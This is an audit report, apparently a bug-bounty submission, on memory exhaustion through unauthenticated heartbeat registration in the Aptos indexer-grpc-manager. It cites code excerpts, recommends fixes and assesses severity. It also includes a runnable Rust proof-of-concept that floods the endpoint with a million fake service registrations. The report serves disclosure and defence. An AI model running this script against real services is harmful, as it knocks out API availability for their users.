# Audit Report

## Title
Unbounded Service Registration via Unauthenticated Heartbeat Messages Enables Memory Exhaustion DoS in Indexer gRPC Manager

## Summary
The `MetadataManager` in the indexer-grpc-manager uses unbounded `DashMap` collections to store live and historical data services without authentication on the heartbeat endpoint. An attacker can send heartbeat messages with unlimited unique service addresses to exhaust memory and crash the indexer-grpc-manager service.

## Finding Description

The `MetadataManager` struct maintains two unbounded `DashMap` collections for tracking data services: [1](#0-0) 

The gRPC heartbeat endpoint has no authentication or authorization checks, allowing any client to send `HeartbeatRequest` messages: [2](#0-1) 

When a heartbeat is received with a new service address, the handlers unconditionally create new service entries using `.entry(address).or_insert()`: [3](#0-2) [4](#0-3) 

Each service entry allocates a `DataServiceClient<Channel>` (gRPC client connection) and a `VecDeque` that can hold up to 100 state snapshots. There is no limit on the number of unique service addresses that can be registered.

The cleanup mechanism only removes services whose last heartbeat timestamp is more than 60 seconds stale: [5](#0-4) 

**Attack Path:**
1. Attacker sends heartbeat messages with unique fake addresses (e.g., `fake-service-1.example.com`, `fake-service-2.example.com`, etc.)
2. Each unique address creates a new entry in the DashMap with associated client connection and state storage
3. By sending heartbeats for millions of fake addresses at intervals less than 60 seconds, all entries remain in memory
4. Memory exhaustion leads to OOM crash of the grpc-manager process

The server setup includes no rate limiting or authentication middleware: [6](#0-5) 

## Impact Explanation

This vulnerability causes a Denial of Service on the indexer-grpc-manager API service. According to the Aptos bug bounty severity categories, this qualifies as **High Severity** (not Critical as labeled in the question) because it results in "API crashes."

While the indexer-grpc-manager is part of the Aptos ecosystem infrastructure, it is **not part of the core consensus, execution, or validator operations**. A crash of this service would:
- Disrupt indexer API availability for clients querying blockchain data
- NOT affect consensus, block production, or validator operations
- NOT cause loss of funds or state corruption

The severity classification as "Critical" in the security question is **incorrect**. Critical severity requires consensus violations, RCE on validator nodes, or total loss of network availability. This vulnerability affects only the indexer API layer.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication required
- No rate limiting present
- Simple gRPC client can send unlimited heartbeat messages
- Attack can be automated with a simple script
- Resource consumption grows linearly with number of fake services

The only barrier is network access to the grpc-manager endpoint. If this service is exposed to the internet or untrusted networks, exploitation is straightforward.

## Recommendation

Implement multiple defensive layers:

1. **Authentication**: Add API key or mTLS authentication to the heartbeat endpoint
2. **Rate Limiting**: Implement per-source rate limits on heartbeat requests
3. **Service Registry Limits**: Add a maximum limit on the number of registered services
4. **Address Validation**: Validate that service addresses are reachable before registration
5. **Allowlist**: Maintain an allowlist of authorized service addresses

Example fix for adding a size limit:

```rust
const MAX_SERVICES_PER_TYPE: usize = 1000;

fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    if self.live_data_services.len() >= MAX_SERVICES_PER_TYPE 
       && !self.live_data_services.contains_key(&address) {
        bail!("Maximum number of live data services reached");
    }
    // ... rest of function
}
```

## Proof of Concept

```rust
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest,
    LiveDataServiceInfo,
    ServiceInfo,
    StreamInfo,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let channel = Channel::from_static("http://[GRPC_MANAGER_ADDRESS]:50051")
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);

    // Send heartbeats for millions of fake services
    for i in 0..1_000_000 {
        let fake_address = format!("fake-service-{}.example.com:50051", i);
        
        let request = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(fake_address),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                    known_latest_version: Some(1000),
                    stream_info: Some(StreamInfo {
                        active_streams: vec![],
                    }),
                    min_servable_version: Some(0),
                })),
            }),
        };

        client.heartbeat(request).await?;
        
        if i % 10000 == 0 {
            println!("Registered {} fake services", i);
        }
    }

    println!("Memory exhaustion attack complete");
    Ok(())
}
```

## Notes

While this is a **valid vulnerability** with a clear attack path and exploitability, the severity classification in the original question is incorrect. This is **High Severity** (API crashes), not **Critical Severity**. The indexer-grpc-manager is part of the indexer infrastructure ecosystem and does not directly impact consensus, validator operations, or core blockchain functionality. Network-level DoS attacks are excluded from the bug bounty, but this is an application-level resource exhaustion vulnerability, which is typically in scope.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L132-133)
```rust
    live_data_services: DashMap<GrpcAddress, LiveDataService>,
    historical_data_services: DashMap<GrpcAddress, HistoricalDataService>,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L217-304)
```rust
                for kv in &self.live_data_services {
                    let (address, live_data_service) = kv.pair();
                    let unreachable = live_data_service.recent_states.back().is_some_and(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(60),
                        )
                    });
                    if unreachable {
                        unreachable_live_data_services.push(address.clone());
                        continue;
                    }
                    let need_ping = live_data_service.recent_states.back().is_none_or(|s| {
                        Self::is_stale_timestamp(
                            s.timestamp.unwrap_or_default(),
                            Duration::from_secs(5),
                        )
                    });
                    if need_ping {
                        let address = address.clone();
                        let client = live_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) =
                                self.ping_live_data_service(address.clone(), client).await
                            {
                                warn!("Failed to ping live data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged live data service ({address}).");
                            }
                        });
                    }
                }

                for kv in &self.historical_data_services {
                    let (address, historical_data_service) = kv.pair();
                    let unreachable =
                        historical_data_service
                            .recent_states
                            .back()
                            .is_some_and(|s| {
                                Self::is_stale_timestamp(
                                    s.timestamp.unwrap_or_default(),
                                    Duration::from_secs(60),
                                )
                            });
                    if unreachable {
                        unreachable_historical_data_services.push(address.clone());
                        continue;
                    }
                    let need_ping = historical_data_service
                        .recent_states
                        .back()
                        .is_none_or(|s| {
                            Self::is_stale_timestamp(
                                s.timestamp.unwrap_or_default(),
                                Duration::from_secs(5),
                            )
                        });
                    if need_ping {
                        let address = address.clone();
                        let client = historical_data_service.client.clone();
                        s.spawn(async move {
                            if let Err(e) = self
                                .ping_historical_data_service(address.clone(), client)
                                .await
                            {
                                warn!("Failed to ping historical data service ({address}): {e:?}.");
                            } else {
                                trace!("Successfully pinged historical data service ({address}).");
                            }
                        });
                    }
                }
            });

            for address in unreachable_live_data_services {
                COUNTER
                    .with_label_values(&["unreachable_live_data_service"])
                    .inc();
                self.live_data_services.remove(&address);
            }

            for address in unreachable_historical_data_services {
                COUNTER
                    .with_label_values(&["unreachable_historical_data_service"])
                    .inc();
                self.historical_data_services.remove(&address);
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-105)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

```
